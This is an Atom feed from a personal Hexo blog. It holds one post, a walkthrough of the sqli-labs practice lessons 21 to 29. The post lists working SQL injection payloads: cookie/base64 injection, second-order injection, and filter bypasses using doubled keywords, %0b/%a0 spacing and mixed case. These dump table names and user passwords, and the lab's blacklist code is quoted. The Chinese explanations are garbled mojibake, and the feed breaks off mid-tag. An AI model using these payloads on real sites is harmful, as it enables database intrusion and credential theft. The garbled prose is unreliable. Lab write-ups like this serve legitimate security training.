<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lluna&#39;s Pure land.</title>
  
  <subtitle>What is life like when singing to wine?</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2021-01-19T03:42:51.669Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sqli_labs_Page2(advance)</title>
    <link href="https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/"/>
    <id>https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/</id>
    <published>2021-01-19T03:24:02.000Z</published>
    <updated>2021-01-19T03:42:51.669Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page2(advance)</strong></p><p> <strong>skip:åŸºç¡€ç¯‡ç¯å¢ƒä¸ºwindowsï¼Œä½†åœ¨æé«˜ç¯‡æœ‰äº›å…³å¡ä¼šå‡ºç°è§£æé”™è¯¯ï¼Œæœ¬ç¯‡ä½¿ç”¨dockeræ­å»ºçš„Linuxç¯å¢ƒ</strong></p><a id="more"></a><h2 id="0x01-Less-21-Cookieæ³¨å…¥-base64ç¼–ç -å•å¼•å·åŠ æ‹¬å·"><a href="#0x01-Less-21-Cookieæ³¨å…¥-base64ç¼–ç -å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x01.Less-21 Cookieæ³¨å…¥ base64ç¼–ç  å•å¼•å·åŠ æ‹¬å·"></a>0x01.Less-21 Cookieæ³¨å…¥ base64ç¼–ç  å•å¼•å·åŠ æ‹¬å·</h2><p><code>demo payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) order by 4 -- -</span><br><span class="line">YWRtaW4nKSBvcmRlciBieSA0IC0tIC0=</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142128479.png" class><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;) union select 1,2,database() -- -</span><br><span class="line">MCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSAtLSAt</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142319509.png" class><blockquote><p>å…¶ä»–æ–¹å¼ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x02-Less-22-Cookieæ³¨å…¥-base64ç¼–ç -åŒå¼•å·"><a href="#0x02-Less-22-Cookieæ³¨å…¥-base64ç¼–ç -åŒå¼•å·" class="headerlink" title="0x02.Less-22 Cookieæ³¨å…¥ base64ç¼–ç  åŒå¼•å·"></a>0x02.Less-22 Cookieæ³¨å…¥ base64ç¼–ç  åŒå¼•å·</h2><blockquote><p>åŒLess-21ï¼Œå°†é—­åˆå­—ç¬¦æ¢ä¸ºåŒå¼•å·å³å¯</p></blockquote><h2 id="0x03-Less-23-åŸºäºæŠ¥é”™-è¿‡æ»¤æ³¨é‡Š"><a href="#0x03-Less-23-åŸºäºæŠ¥é”™-è¿‡æ»¤æ³¨é‡Š" class="headerlink" title="0x03.Less-23 åŸºäºæŠ¥é”™ è¿‡æ»¤æ³¨é‡Š"></a>0x03.Less-23 åŸºäºæŠ¥é”™ è¿‡æ»¤æ³¨é‡Š</h2><p><code>æ­¤é¢˜è¿‡æ»¤äº†--å’Œ#ï¼Œæµ‹è¯•å‘ç°é—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145228775.png" class><p><code>æ—¢ç„¶è¿‡æ»¤äº†æ³¨é‡Šç¬¦é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨äºŒæ¬¡æ³¨å…¥ç»“åˆ%00è¿›è¡Œæˆªæ–­</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4;%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145628665.png" class><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),user();%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145754610.png" class><blockquote><p>å…¶ä»–æ–¹æ³•ä¸åœ¨èµ˜è¿°</p></blockquote><p><code>ä¹Ÿå¯ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,database() &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150158281.png" class><p><code>çˆ†è¡¨ï¼Œä»¥ä¸‹ä¸¤ä¸ªpayloadå‡å¯ä»¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150637871.png" class><p><code>çˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151251994.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151415888.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select username from users limit 0,1),3 &#x27;</span><br><span class="line">?id=0&#x27; union select 1,(select password from users limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;1&#x27; = &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151653100.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151801467.png" class><h2 id="0x04-Less-24-äºŒæ¬¡æ³¨å…¥"><a href="#0x04-Less-24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="0x04.Less-24 äºŒæ¬¡æ³¨å…¥"></a>0x04.Less-24 äºŒæ¬¡æ³¨å…¥</h2><p><code>é¡µé¢å¯ä»¥æ³¨å†Œç”¨æˆ·</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152202362.png" class><blockquote><p>æ€è·¯ä¸ºæ³¨å†Œä¸€ä¸ªadminâ€™ â€“ -æˆ–adminâ€™# ç”¨æˆ·ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹å¯†ç æ“ä½œ</p></blockquote><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152940647.png" class><p><code>admin&#39; -- -ç™»å…¥</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153011802.png" class><p><code>ä¿®æ”¹å¯†ç </code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153045305.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153058942.png" class><p><code>é€€å‡ºä½¿ç”¨adminç™»å…¥</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153139415.png" class><h2 id="0x05-Less-25-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤andä¸or-å•å¼•å·"><a href="#0x05-Less-25-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤andä¸or-å•å¼•å·" class="headerlink" title="0x05.Less-25 GET åŸºäºæŠ¥é”™ è¿‡æ»¤andä¸or å•å¼•å·"></a>0x05.Less-25 GET åŸºäºæŠ¥é”™ è¿‡æ»¤andä¸or å•å¼•å·</h2><p><code>è¿‡æ»¤äº†andä¸orå¯ä»¥ä½¿ç”¨åŒå†™ã€å¤§å°å†™æ··åˆã€å†…è”æ³¨é‡Šã€urlå…¨ç¼–ç è¿›è¡Œç»•è¿‡ï¼›andä¸orå¯ä»¥ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦(|| &amp;&amp;)è¿›è¡Œä»£æ›¿</code></p><blockquote><p>æµ‹è¯•å‘ç°åªèƒ½ä½¿ç”¨åŒå†™</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116155639053.png" class><blockquote><p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x06-Less-25a-GET-åŸºäºbool-è¿‡æ»¤andä¸or"><a href="#0x06-Less-25a-GET-åŸºäºbool-è¿‡æ»¤andä¸or" class="headerlink" title="0x06.Less-25a GET åŸºäºbool è¿‡æ»¤andä¸or"></a>0x06.Less-25a GET åŸºäºbool è¿‡æ»¤andä¸or</h2><p><code>ä¸Less-25ç›¸ä¼¼ï¼Œä½†æ²¡æœ‰å•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 aandnd if(length(database())=8,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥ä½¿ç”¨unionè”åˆæŸ¥è¯¢</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116161933977.png" class><blockquote><p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p></blockquote><h2 id="0x07-Less-26-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦"><a href="#0x07-Less-26-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦" class="headerlink" title="0x07.Less-26 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦"></a>0x07.Less-26 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦</h2><p><code>æŸ¥çœ‹æºç ï¼Œå‘ç°è¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>æµ‹è¯•é—­åˆå­—ç¬¦ï¼Œç”±äºè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ä½¿ç”¨%a0æˆ–%0bä»£æ›¿ç©ºæ ¼ï¼Œè¿™é‡Œå‘ç°å•å¼•å·ä¸ºé—­åˆå­—ç¬¦</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;2</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215557295.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215623266.png" class><p><code>æµ‹è¯•å­—æ®µæ•°ï¼Œç»“æœä¸º4ä¸ª</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3,4%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220053016.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220136142.png" class><p><code>çˆ†åº“ï¼Œandå¯ä»¥æ¢ä¸ºor</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml%0b(1,concat(0x7e,(select%0bdatabase()),0x7e),3)%0baandnd &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221324429.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0btable_name%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()%0blimit%0b3,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221948346.png" class><p><code>çˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b1,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b2,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222502329.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222540036.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0busername%0bfrom%0busers%0blimit%0b0,1),0x7e),1)%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">0&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222910222.png" class><p><code>ä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½ä¸€ä¸ªä¸€ä¸ªçˆ†ï¼Œå¯ä»¥ä½¿ç”¨group_concat()å‡½æ•°</code></p><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,database()%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;union%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1    // %26ä¸º&amp;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224140184.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224638239.png" class><p><code>çˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_name=&#x27;users&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117225229097.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b%271%27=%271</span><br><span class="line"></span><br><span class="line">// where 1=1 ä¸ºæ— çº¦æŸæŸ¥è¯¢</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230259432.png" class><h2 id="0x08-Less-26a-GET-åŸºäºbool-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·"><a href="#0x08-Less-26a-GET-åŸºäºbool-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x08.Less-26a GET åŸºäºbool è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·"></a>0x08.Less-26a GET åŸºäºbool è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·</h2><p><code>åŒLess-26ç›¸åŒï¼Œéœ€è¦åœ¨å•å¼•å·ååŠ ä¸€ä¸ªæ‹¬å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere(%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230816390.png" class><h2 id="0x09-Less-27-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦-å•å¼•å·"><a href="#0x09-Less-27-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦-å•å¼•å·" class="headerlink" title="0x09.Less-27 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦ å•å¼•å·"></a>0x09.Less-27 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦ å•å¼•å·</h2><p><code>æŸ¥çœ‹æºç å‘ç°åˆè¿‡æ»¤unionã€select</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>è¿™é‡Œå¯ä»¥ä½¿ç”¨å¤§å°å†™è¿›è¡Œç»•è¿‡ï¼Œå¦‚uNionã€sElectï¼Œæ–¹æ³•åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118180520892.png" class><h2 id="0x10-Less-27a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·"><a href="#0x10-Less-27a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·" class="headerlink" title="0x10.Less-27a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·"></a>0x10.Less-27a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·</h2><p><code>åŒä¸Šéœ€å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182211616.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182234928.png" class><p><code>æµ‹è¯•å­—æ®µæ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3,4%0band%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182105167.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182130359.png" class><p><code>æ”¾æ³•åŒä¸Šä¸€é¢˜ä¸åœ¨èµ˜è¿°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182421291.png" class><h2 id="0x11-Less-28-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·"><a href="#0x11-Less-28-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x11.Less-28 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·"></a>0x11.Less-28 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·</h2><p><code>é—­åˆå­—ç¬¦ä¸º&#39;)å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere(&#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118191510874.png" class><h2 id="0x12-Less-28a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·"><a href="#0x12-Less-28a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·" class="headerlink" title="0x12.Less-28a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·"></a>0x12.Less-28a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·</h2><p><code>é—­åˆå­—ç¬¦ä¸º&quot;å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118192025320.png" class><h2 id="0x13-Less-29-GET-åŸºäºæŠ¥é”™-ç»•è¿‡WAF"><a href="#0x13-Less-29-GET-åŸºäºæŠ¥é”™-ç»•è¿‡WAF" class="headerlink" title="0x13.Less-29 GET åŸºäºæŠ¥é”™ ç»•è¿‡WAF"></a>0x13.Less-29 GET åŸºäºæŠ¥é”™ ç»•è¿‡WAF</h2><p><code>è¯´æ˜¯å­˜åœ¨wafä½†æ˜¯å¸¸è§„æ³¨å…¥å°±å¯ä»¥ï¼Ÿä¸€è„¸æ‡µé€¼ã€‚ã€‚ã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users where &#x27;1=1</span><br></pre></td></tr></table></figure><img 